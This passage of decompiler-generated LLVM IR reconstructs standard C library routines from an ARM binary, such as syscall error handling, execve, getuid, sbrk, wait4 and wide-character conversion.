  %v2_13a6c = add i32 %v1_13a6c, 132
  %v3_13a6c = inttoptr i32 %v2_13a6c to i32*
  %v0_13a70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13a70

dec_label_pc_13a70:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_13a48
  %v0_13a70 = phi i32 [ %v1_13a28, %thread-pre-split ], [ %v0_13a70.pre, %dec_label_pc_13a48 ], [ %v1_13a28, %thread-pre-split.thread ]
  store i32 %v0_13a70, i32* %r0.global-to-local, align 4
  store i32 %v3_139a0, i32* @r4, align 4
  store i32 %v6_139a0, i32* @r5, align 4
  ret i32 %v0_13a70

; uselistorder directives
  uselistorder i32 %v0_13a70, { 1, 0 }
  uselistorder i32 %v0_13a2c, { 1, 0, 2 }
  uselistorder i32 %v0_13a24, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 6, 5, 7, 0 }
  uselistorder label %dec_label_pc_13a70, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_13a04, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_13a84 = load i32, i32* @r4, align 4
  store i32 %v3_13a84, i32* %stack_var_-8, align 4
  %v0_13a88 = load i32, i32* @r0, align 4
  %v0_13a8c = call i32 @__errno_location()
  %v1_13a90 = sub i32 0, %v0_13a88
  %v2_13a94 = inttoptr i32 %v0_13a8c to i32*
  store i32 %v1_13a90, i32* %v2_13a94, align 4
  %v2_13a9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13a9c, i32* @r4, align 4
  ret i32 -1
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_13aa0 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_13aa0
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_13aa4 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_13aa4
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13aa8 = load i32, i32* @r4, align 4
  store i32 %v3_13aa8, i32* %stack_var_-8, align 4
  %v1_13aac = load i32, i32* @r1, align 4
  %v2_13aac = inttoptr i32 %v1_13aac to %sigaction*
  %v3_13aac = load i32, i32* @r2, align 4
  %v4_13aac = inttoptr i32 %v3_13aac to %sigaction*
  %v5_13aac = call i32 @sigaction(i32 %arg1, %sigaction* %v2_13aac, %sigaction* %v4_13aac)
  store i32 %v5_13aac, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13aac, -4095
  br i1 %tmp, label %dec_label_pc_13acc, label %dec_label_pc_13abc

dec_label_pc_13abc:                               ; preds = %entry
  %v0_13abc = call i32 @__errno_location()
  %v0_13ac0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13ac0 = sub i32 0, %v0_13ac0
  %v2_13ac4 = inttoptr i32 %v0_13abc to i32*
  store i32 %v1_13ac0, i32* %v2_13ac4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13acc

dec_label_pc_13acc:                               ; preds = %entry, %dec_label_pc_13abc
  %v0_13acc = phi i32 [ %v5_13aac, %entry ], [ -1, %dec_label_pc_13abc ]
  %v2_13ad0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13ad0, i32* %r4.global-to-local, align 4
  ret i32 %v0_13acc

; uselistorder directives
  uselistorder i32 %v5_13aac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13acc, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ad4 = load i32, i32* @r4, align 4
  store i32 %v3_13ad4, i32* %stack_var_-8, align 4
  %v0_13ad8 = load i32, i32* @r0, align 4
  %v1_13ad8 = inttoptr i32 %v0_13ad8 to i8*
  %v2_13ad8 = load i32, i32* @r1, align 4
  %v3_13ad8 = inttoptr i32 %v2_13ad8 to i8*
  %v4_13ad8 = insertvalue [1 x i8*] undef, i8* %v3_13ad8, 0
  %v5_13ad8 = load i32, i32* @r2, align 4
  %v6_13ad8 = inttoptr i32 %v5_13ad8 to i8*
  %v7_13ad8 = insertvalue [1 x i8*] undef, i8* %v6_13ad8, 0
  %v8_13ad8 = call i32 @execve(i8* %v1_13ad8, [1 x i8*] %v4_13ad8, [1 x i8*] %v7_13ad8)
  store i32 %v8_13ad8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_13ad8, -4095
  br i1 %tmp, label %dec_label_pc_13af8, label %dec_label_pc_13ae8

dec_label_pc_13ae8:                               ; preds = %entry
  %v0_13ae8 = call i32 @__errno_location()
  %v0_13aec = load i32, i32* %r4.global-to-local, align 4
  %v1_13aec = sub i32 0, %v0_13aec
  %v2_13af0 = inttoptr i32 %v0_13ae8 to i32*
  store i32 %v1_13aec, i32* %v2_13af0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13af8

dec_label_pc_13af8:                               ; preds = %entry, %dec_label_pc_13ae8
  %v0_13af8 = phi i32 [ %v8_13ad8, %entry ], [ -1, %dec_label_pc_13ae8 ]
  %v2_13afc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13afc, i32* @r4, align 4
  ret i32 %v0_13af8

; uselistorder directives
  uselistorder i32 %v8_13ad8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13af8, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13b00 = load i32, i32* @r4, align 4
  store i32 %v3_13b00, i32* %stack_var_-8, align 4
  %v0_13b08 = load i32, i32* @r0, align 4
  store i32 %v0_13b08, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13b08, -4095
  br i1 %tmp, label %dec_label_pc_13b24, label %dec_label_pc_13b14

dec_label_pc_13b14:                               ; preds = %entry
  %v0_13b14 = call i32 @__errno_location()
  %v0_13b18 = load i32, i32* %r4.global-to-local, align 4
  %v1_13b18 = sub i32 0, %v0_13b18
  %v2_13b1c = inttoptr i32 %v0_13b14 to i32*
  store i32 %v1_13b18, i32* %v2_13b1c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13b28.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13b24

dec_label_pc_13b24:                               ; preds = %entry, %dec_label_pc_13b14
  %v2_13b28 = phi i32 [ %v3_13b00, %entry ], [ %v2_13b28.pre, %dec_label_pc_13b14 ]
  %v0_13b24 = phi i32 [ %v0_13b08, %entry ], [ -1, %dec_label_pc_13b14 ]
  store i32 %v2_13b28, i32* @r4, align 4
  ret i32 %v0_13b24

; uselistorder directives
  uselistorder i32 %v0_13b08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b24, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13b2c = load i32, i32* @r4, align 4
  store i32 %v3_13b2c, i32* %stack_var_-8, align 4
  %v0_13b34 = load i32, i32* @r0, align 4
  store i32 %v0_13b34, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13b34, -4095
  br i1 %tmp, label %dec_label_pc_13b50, label %dec_label_pc_13b40

dec_label_pc_13b40:                               ; preds = %entry
  %v0_13b40 = call i32 @__errno_location()
  %v0_13b44 = load i32, i32* %r4.global-to-local, align 4
  %v1_13b44 = sub i32 0, %v0_13b44
  %v2_13b48 = inttoptr i32 %v0_13b40 to i32*
  store i32 %v1_13b44, i32* %v2_13b48, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13b54.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13b50

dec_label_pc_13b50:                               ; preds = %entry, %dec_label_pc_13b40
  %v2_13b54 = phi i32 [ %v3_13b2c, %entry ], [ %v2_13b54.pre, %dec_label_pc_13b40 ]
  %v0_13b50 = phi i32 [ %v0_13b34, %entry ], [ -1, %dec_label_pc_13b40 ]
  store i32 %v2_13b54, i32* @r4, align 4
  ret i32 %v0_13b50

; uselistorder directives
  uselistorder i32 %v0_13b34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b50, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13b58 = load i32, i32* @r4, align 4
  store i32 %v3_13b58, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13b7c, label %dec_label_pc_13b6c

dec_label_pc_13b6c:                               ; preds = %entry
  %v0_13b6c = call i32 @__errno_location()
  %v0_13b70 = load i32, i32* %r4.global-to-local, align 4
  %v1_13b70 = sub i32 0, %v0_13b70
  %v2_13b74 = inttoptr i32 %v0_13b6c to i32*
  store i32 %v1_13b70, i32* %v2_13b74, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13b80.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13b7c

dec_label_pc_13b7c:                               ; preds = %entry, %dec_label_pc_13b6c
  %v2_13b80 = phi i32 [ %v3_13b58, %entry ], [ %v2_13b80.pre, %dec_label_pc_13b6c ]
  %v0_13b7c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_13b6c ]
  store i32 %v2_13b80, i32* %r4.global-to-local, align 4
  ret i32 %v0_13b7c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b7c, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13b84 = load i32, i32* @r4, align 4
  store i32 %v3_13b84, i32* %stack_var_-8, align 4
  %v0_13b8c = load i32, i32* @r0, align 4
  store i32 %v0_13b8c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13b8c, -4095
  br i1 %tmp, label %dec_label_pc_13ba8, label %dec_label_pc_13b98

dec_label_pc_13b98:                               ; preds = %entry
  %v0_13b98 = call i32 @__errno_location()
  %v0_13b9c = load i32, i32* %r4.global-to-local, align 4
  %v1_13b9c = sub i32 0, %v0_13b9c
  %v2_13ba0 = inttoptr i32 %v0_13b98 to i32*
  store i32 %v1_13b9c, i32* %v2_13ba0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13bac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13ba8

dec_label_pc_13ba8:                               ; preds = %entry, %dec_label_pc_13b98
  %v2_13bac = phi i32 [ %v3_13b84, %entry ], [ %v2_13bac.pre, %dec_label_pc_13b98 ]
  %v0_13ba8 = phi i32 [ %v0_13b8c, %entry ], [ -1, %dec_label_pc_13b98 ]
  store i32 %v2_13bac, i32* %r4.global-to-local, align 4
  ret i32 %v0_13ba8

; uselistorder directives
  uselistorder i32 %v0_13b8c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ba8, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_13bb0 = load i32, i32* @r4, align 4
  store i32 %v3_13bb0, i32* %stack_var_-8, align 4
  %v6_13bb4 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_13bb4, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_13bb4, -4095
  br i1 %tmp6, label %dec_label_pc_13bd4, label %dec_label_pc_13bc4

dec_label_pc_13bc4:                               ; preds = %entry
  %v0_13bc4 = call i32 @__errno_location()
  %v0_13bc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13bc8 = sub i32 0, %v0_13bc8
  %v2_13bcc = inttoptr i32 %v0_13bc4 to i32*
  store i32 %v1_13bc8, i32* %v2_13bcc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13bd4

dec_label_pc_13bd4:                               ; preds = %entry, %dec_label_pc_13bc4
  %v0_13bd4 = phi i32 [ %v6_13bb4, %entry ], [ -1, %dec_label_pc_13bc4 ]
  %v2_13bd8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13bd8, i32* %r4.global-to-local, align 4
  ret i32 %v0_13bd4

; uselistorder directives
  uselistorder i32 %v6_13bb4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13bd4, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13bdc = load i32, i32* @r4, align 4
  store i32 %v3_13bdc, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_28ae0.560 to i32), i32* %r4.global-to-local, align 4
  %v2_13be4 = load i32, i32* @global_var_28ae0.560, align 4
  %v2_13be8 = icmp eq i32 %v2_13be4, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_13be8, label %dec_label_pc_13bf8, label %dec_label_pc_13c04

dec_label_pc_13bf8:                               ; preds = %entry
  %v2_13bf8 = call i32 @__GI_brk(i32* null)
  %v1_13bfc = icmp slt i32 %v2_13bf8, 0
  br i1 %v1_13bfc, label %dec_label_pc_13c24, label %dec_label_pc_13c04thread-pre-split

dec_label_pc_13c04thread-pre-split:               ; preds = %dec_label_pc_13bf8
  %v0_13c08.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_13c04.pre = load i32, i32* @global_var_28ae0.560, align 4
  br label %dec_label_pc_13c04

dec_label_pc_13c04:                               ; preds = %dec_label_pc_13c04thread-pre-split, %entry
  %v2_13c04 = phi i32 [ %v2_13c04.pre, %dec_label_pc_13c04thread-pre-split ], [ %v2_13be4, %entry ]
  %v1_13c10 = phi i32 [ %v0_13c08.pr, %dec_label_pc_13c04thread-pre-split ], [ %arg1, %entry ]
  %v2_13c08 = icmp eq i32 %v1_13c10, 0
  store i32 %v2_13c04, i32* %r4.global-to-local, align 4
  br i1 %v2_13c08, label %dec_label_pc_13c28, label %dec_label_pc_13c18

dec_label_pc_13c18:                               ; preds = %dec_label_pc_13c04
  %v2_13c10 = add i32 %v1_13c10, %v2_13c04
  %v1_13c18 = inttoptr i32 %v2_13c10 to i32*
  %v2_13c18 = call i32 @__GI_brk(i32* %v1_13c18)
  %v1_13c1c = icmp slt i32 %v2_13c18, 0
  br i1 %v1_13c1c, label %dec_label_pc_13c24, label %dec_label_pc_13c18.dec_label_pc_13c28_crit_edge

dec_label_pc_13c18.dec_label_pc_13c28_crit_edge:  ; preds = %dec_label_pc_13c18
  %v0_13c28.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c28

dec_label_pc_13c24:                               ; preds = %dec_label_pc_13c18, %dec_label_pc_13bf8
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c28

dec_label_pc_13c28:                               ; preds = %dec_label_pc_13c18.dec_label_pc_13c28_crit_edge, %dec_label_pc_13c04, %dec_label_pc_13c24
  %v0_13c28 = phi i32 [ %v0_13c28.pre, %dec_label_pc_13c18.dec_label_pc_13c28_crit_edge ], [ %v2_13c04, %dec_label_pc_13c04 ], [ -1, %dec_label_pc_13c24 ]
  %v2_13c2c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13c2c, i32* @r4, align 4
  ret i32 %v0_13c28

; uselistorder directives
  uselistorder i32 %v2_13c04, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 3, 4, 5, 6, 7, 9, 10, 8, 11, 12, 13, 14, 15, 16, 22, 23, 20, 21, 19, 18, 17, 24, 25, 26, 2 }
  uselistorder label %dec_label_pc_13c28, { 2, 0, 1 }
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13c34 = load i32, i32* @r4, align 4
  store i32 %v3_13c34, i32* %stack_var_-8, align 4
  %v0_13c38 = call i32 @wait4()
  store i32 %v0_13c38, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13c38, -4095
  br i1 %tmp, label %dec_label_pc_13c58, label %dec_label_pc_13c48

dec_label_pc_13c48:                               ; preds = %entry
  %v0_13c48 = call i32 @__errno_location()
  %v0_13c4c = load i32, i32* %r4.global-to-local, align 4
  %v1_13c4c = sub i32 0, %v0_13c4c
  %v2_13c50 = inttoptr i32 %v0_13c48 to i32*
  store i32 %v1_13c4c, i32* %v2_13c50, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c58

dec_label_pc_13c58:                               ; preds = %entry, %dec_label_pc_13c48
  %v0_13c58 = phi i32 [ %v0_13c38, %entry ], [ -1, %dec_label_pc_13c48 ]
  %v2_13c5c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13c5c, i32* @r4, align 4
  ret i32 %v0_13c58

; uselistorder directives
  uselistorder i32 %v0_13c38, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_13c58, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_28ac0.562 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_13c70 = icmp eq i32 %arg1, 0
  br i1 %v2_13c70, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_13c78 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_13ca0 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_13c94 = phi i32 [ %arg1, %.thread ], [ %v3_13c78, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_13c8c = ptrtoint i32* %stack_var_-16 to i32
  %v2_13c98 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_13c98, i32* %stack_var_-16, align 4
  store i32 %v0_13ca0, i32* %stack_var_-12, align 4
  %v5_13ca8 = inttoptr i32 %v0_13c94 to i8*
  %v6_13ca8 = call i32 @__GI_wcsnrtombs(i8* %v5_13ca8, i32 %v2_13c8c, i32 1, i32 16, i32 %arg3)
  %v2_13cac = icmp eq i32 %v6_13ca8, 0
  br i1 %v2_13cac, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_13cb8 = phi i32 [ %v6_13ca8, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_13cb8

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_13cc8 = load i32, i32* @r2, align 4
  store i32 %v0_13cc8, i32* @r3, align 4
  %v0_13cd0 = load i32, i32* @r0, align 4
  %v1_13cd0 = load i32, i32* @r1, align 4
  %v5_13cd0 = inttoptr i32 %v0_13cd0 to i8*
  %v6_13cd0 = call i32 @__GI_wcsnrtombs(i8* %v5_13cd0, i32 %v1_13cd0, i32 -1, i32 %v0_13cc8, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_13cd0
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13cdc = load i32, i32* @r4, align 4
  store i32 %v3_13cdc, i32* %stack_var_-8, align 4
  %v10_13ce0 = icmp eq i32 %tmp, %arg2
  br i1 %v10_13ce0, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_13ce81 = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13cfc

bb:                                               ; preds = %entry
  %v4_13ce4 = icmp eq i8* %arg1, null
  %v0_13ce8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @ip, align 4
  br i1 %v4_13ce4, label %dec_label_pc_13cfc, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d38

dec_label_pc_13cfc:                               ; preds = %.thread, %bb
  %v1_13d3c.ph = phi i32 [ %v0_13ce8, %bb ], [ %v0_13ce81, %.thread ]
  %v2_13cec3.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_13cfc = icmp eq i8* %arg1, null
  store i32 %v2_13cec3.ph, i32* @ip, align 4
  br i1 %v3_13cfc, label %.thread4, label %dec_label_pc_13d30

.thread4:                                         ; preds = %dec_label_pc_13cfc
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_13d38

dec_label_pc_13d14:                               ; preds = %dec_label_pc_13d50
  %v0_13d14 = call i32 @__errno_location()
  store i32 %v0_13d14, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13d20 = inttoptr i32 %v0_13d14 to i32*
  store i32 84, i32* %v2_13d20, align 4
  %v0_13d8c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d8c

dec_label_pc_13d28:                               ; preds = %dec_label_pc_13d60
  %v3_13d64 = zext i8 %v2_13d64 to i32
  store i32 %v3_13d64, i32* @lr, align 4
  br label %dec_label_pc_13d80

dec_label_pc_13d30:                               ; preds = %dec_label_pc_13cfc
  store i32 %v2_13cec3.ph, i32* @ip, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d38

dec_label_pc_13d38:                               ; preds = %bb27, %.thread4, %dec_label_pc_13d30
  %v1_13d3c20 = phi i32 [ %v0_13ce8, %bb27 ], [ %v1_13d3c.ph, %.thread4 ], [ %v1_13d3c.ph, %dec_label_pc_13d30 ]
  %v2_13d6014 = phi i32 [ %tmp, %bb27 ], [ %v2_13cec3.ph, %.thread4 ], [ %v2_13cec3.ph, %dec_label_pc_13d30 ]
  %v1_13d38 = load i32, i32* @r3, align 4
  %v3_13d38 = icmp uge i32 %v1_13d3c20, %v1_13d38
  %v1_13d38.v1_13d3c20 = select i1 %v3_13d38, i32 %v1_13d38, i32 %v1_13d3c20
  store i32 %v1_13d38.v1_13d3c20, i32* %r4.global-to-local, align 4
  %v1_13d44 = inttoptr i32 %arg2 to i32*
  %v2_13d44 = load i32, i32* %v1_13d44, align 4
  store i32 %v2_13d44, i32* @lr, align 4
  store i32 %v1_13d38.v1_13d3c20, i32* %r0.global-to-local, align 4
  %v2_13d788 = icmp eq i32 %v1_13d38.v1_13d3c20, 0
  br i1 %v2_13d788, label %dec_label_pc_13d80, label %dec_label_pc_13d50

dec_label_pc_13d50:                               ; preds = %dec_label_pc_13d38, %dec_label_pc_13d70.dec_label_pc_13d50_crit_edge
  %v2_13d60 = phi i32 [ %v2_13d70, %dec_label_pc_13d70.dec_label_pc_13d50_crit_edge ], [ %v2_13d6014, %dec_label_pc_13d38 ]
  %v0_13d58 = phi i32 [ %v0_13d50.pre, %dec_label_pc_13d70.dec_label_pc_13d50_crit_edge ], [ %v2_13d44, %dec_label_pc_13d38 ]
  %v1_13d50 = inttoptr i32 %v0_13d58 to i32*
  %v2_13d50 = load i32, i32* %v1_13d50, align 4
  %v1_13d58 = add i32 %v0_13d58, 4
  store i32 %v1_13d58, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_13d50, 127
  br i1 %tmp36, label %dec_label_pc_13d14, label %dec_label_pc_13d60

dec_label_pc_13d60:                               ; preds = %dec_label_pc_13d50
  %v1_13d60 = trunc i32 %v2_13d50 to i8
  %v3_13d60 = inttoptr i32 %v2_13d60 to i8*
  store i8 %v1_13d60, i8* %v3_13d60, align 1
  %v0_13d64 = load i32, i32* @ip, align 4
  %v1_13d64 = inttoptr i32 %v0_13d64 to i8*
  %v2_13d64 = load i8, i8* %v1_13d64, align 1
  %v2_13d68 = icmp eq i8 %v2_13d64, 0
  br i1 %v2_13d68, label %dec_label_pc_13d28, label %dec_label_pc_13d70

dec_label_pc_13d70:                               ; preds = %dec_label_pc_13d60
  %v1_13d70 = load i32, i32* %r2.global-to-local, align 4
  %v2_13d70 = add i32 %v1_13d70, %v0_13d64
  store i32 %v2_13d70, i32* @ip, align 4
  %v0_13d74 = load i32, i32* %r0.global-to-local, align 4
  %v1_13d74 = add i32 %v0_13d74, -1
  store i32 %v1_13d74, i32* %r0.global-to-local, align 4
  %v2_13d78 = icmp eq i32 %v1_13d74, 0
  br i1 %v2_13d78, label %dec_label_pc_13d80, label %dec_label_pc_13d70.dec_label_pc_13d50_crit_edge

dec_label_pc_13d70.dec_label_pc_13d50_crit_edge:  ; preds = %dec_label_pc_13d70
  %v0_13d50.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_13d50

dec_label_pc_13d80:                               ; preds = %dec_label_pc_13d70, %dec_label_pc_13d38, %dec_label_pc_13d28
  %v0_13d80 = phi i32 [ %v0_13d64, %dec_label_pc_13d28 ], [ %v2_13d6014, %dec_label_pc_13d38 ], [ %v2_13d70, %dec_label_pc_13d70 ]
  %v1_13d80 = load i32, i32* @sp, align 4
  %v9_13d80 = icmp eq i32 %v0_13d80, %v1_13d80
  br i1 %v9_13d80, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_13d80
  %v1_13d84 = load i32, i32* @lr, align 4
  store i32 %v1_13d84, i32* %v1_13d44, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_13d80, %bb30
  %v0_13d88 = load i32, i32* %r0.global-to-local, align 4
  %v1_13d88 = load i32, i32* %r4.global-to-local, align 4
  %v2_13d88 = sub i32 %v1_13d88, %v0_13d88
  store i32 %v2_13d88, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d8c

dec_label_pc_13d8c:                               ; preds = %dec_label_pc_13d14, %bb31
  %v0_13d8c = phi i32 [ %v0_13d8c.pre, %dec_label_pc_13d14 ], [ %v2_13d88, %bb31 ]
  store i32 %v0_13d8c, i32* %r0.global-to-local, align 4
  %v2_13d94 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13d94, i32* %r4.global-to-local, align 4
  ret i32 %v0_13d8c

; uselistorder directives
  uselistorder i32 %v0_13d8c, { 1, 0 }
  uselistorder i32 %v1_13d74, { 1, 0 }
  uselistorder i32 %v2_13d70, { 0, 2, 1 }
  uselistorder i32 %v2_13d50, { 1, 0 }
  uselistorder i32 %v2_13d6014, { 1, 0 }
  uselistorder i32 %v1_13d3c.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 6, 3, 0 }
  uselistorder i32* @sp, { 15, 17, 0, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 3, 4, 5, 6, 16 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_13d8c, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_13d50, { 1, 0 }
  uselistorder label %dec_label_pc_13d38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13cfc, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_13dac2 = icmp eq i32 %arg3, 0
  store i1 %v2_13dac2, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_13dac2, label %dec_label_pc_13e4c, label %dec_label_pc_13db8

dec_label_pc_13dacthread-pre-split:               ; preds = %bb22
  %v3_13dd0 = load i32, i32* %r7.global-to-local, align 4
  %v5_13dd0 = add i32 %v3_13dd0, %v4_13dc4
